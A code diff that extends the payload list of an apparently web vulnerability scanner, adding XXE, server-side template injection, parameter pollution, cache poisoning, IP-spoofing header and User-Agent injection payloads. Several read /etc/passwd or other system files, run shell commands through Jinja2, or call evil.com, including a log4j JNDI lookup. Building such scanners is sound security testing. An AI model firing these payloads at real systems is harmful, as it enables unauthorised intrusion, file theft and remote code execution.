@@ -1,5 +1,5 @@
 export type PayloadCategory = {
-  type: 'ParamCheck' | 'FileCheck';
+  type: 'ParamCheck' | 'FileCheck' | 'Header';
   payloads: string[];
 };
 
@@ -161,6 +161,111 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "\\u0027 OR \\u00271\\u0027=\\u00271",  // Unicode encoded SQL injection
       "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",  // UTF-8 encoded with fancy quotes
       "Ω OR Ω=Ω"  // Using Unicode omega characters
+    ]
+  },
+  "XXE": {
+    type: "ParamCheck",
+    payloads: [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+      "<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",
+      "<?xml version=\"1.0\"?><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>"
+    ]
+  },
+  "SSTI": {
+    type: "ParamCheck",
+    payloads: [
+      "{{7*7}}",  // Jinja2
+      "${7*7}",   // Velocity
+      "<%= 7*7 %>", // ERB
+      "{{=7*7}}", // Twig
+      "#{7*7}",    // Ruby
+      "{{7*'7'}}", // Jinja2 string multiplication
+      "{{config}}", // Jinja2 variable leak
+      "{{self}}",   // Jinja2 self leak
+      "{{[].__class__.__mro__[1].__subclasses__()}}", // Jinja2 class leak
+      "{{().__class__.__bases__[0].__subclasses__()}}", // Python
+      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", // Jinja2 RCE
+      "<%={{7*7}}%>", // AngularJS
+      "${{7*7}}", // Go templates
+      "{{request}}", // Flask/Jinja2
+      "{{url_for}}", // Flask/Jinja2
+      "{{cycler.__init__.__globals__.os.popen('id').read()}}" // Jinja2 RCE
+    ]
+  },
+  "HTTP Parameter Pollution": {
+    type: "ParamCheck",
+    payloads: [
+      "param=1&param=2",
+      "user=admin&user=guest",
+      "id=1;id=2",
+      "param=1&&param=2",
+      "param=1;param=2",
+      "param=1,param=2",
+      "param=1 param=2",
+      "param=1&param=",
+      "param=&param=2",
+      "param=1&Param=2",
+      "param[0]=1&param[1]=2",
+      "param[]=1&param[]=2",
+      "param=1&%70%61%72%61%6d=2",
+      "param=1&par%61m=2",
+      "param.1=1&param.2=2",
+      "param=1|param=2",
+      "param[a]=1&param[b]=2"
+    ]
+  },
+  "Web Cache Poisoning": {
+    type: "Header",
+    payloads: [
+      "X-Forwarded-Host: evil.com",
+      "X-Original-URL: /admin",
+      "Cache-Control: no-cache",
+      "X-Forwarded-Proto: https",
+      "X-Host: evil.com",
+      "X-Forwarded-Scheme: javascript://",
+      "X-HTTP-Method-Override: PURGE",
+      "X-Forwarded-Server: evil.com",
+      "X-Forwarded-Port: 443",
+      "X-Original-Host: evil.com"
+    ]
+  },
+  "IP Bypass": {
+    type: "Header",
+    payloads: [
+      "X-Forwarded-For: 127.0.0.1",
+      "X-Remote-IP: 127.0.0.1",
+      "X-Remote-Addr: 127.0.0.1",
+      "X-Client-IP: 127.0.0.1",
+      "X-Real-IP: 127.0.0.1",
+      "X-Forwarded-For: 127.0.0.1, evil.com",
+      "X-Forwarded-For: 127.0.0.1, 2130706433",
+      "X-Forwarded-For: 127.0.0.1, localhost",
+      "X-Forwarded-For: 127.0.0.1, 0.0.0.0",
+      "X-Forwarded-For: 127.0.0.1, ::1",
+      "X-Forwarded-For: 127.0.0.1, 0177.0.0.1",
+      "X-Forwarded-For: 127.0.0.1, 127.1"
+    ]
+  },
+  "User-Agent": {
+    type: "Header",
+    payloads: [
+      "User-Agent:", // пустой
+      "User-Agent: \x00", // нуль-байт
+      "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)", // Googlebot
+      "User-Agent: {{7*7}}", // SSTI
+      "User-Agent: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", // XXE
+      "User-Agent: <script>alert('xss')</script>", // XSS
+      "User-Agent: %0d%0aSet-Cookie: injected=true", // CRLF
+      "User-Agent: ' OR '1'='1", // SQLi
+      "User-Agent: *)(uid=*))(|(uid=*)", // LDAP
+      "User-Agent: ${jndi:ldap://evil.com/a}" // log4j
     ]
   }
 };
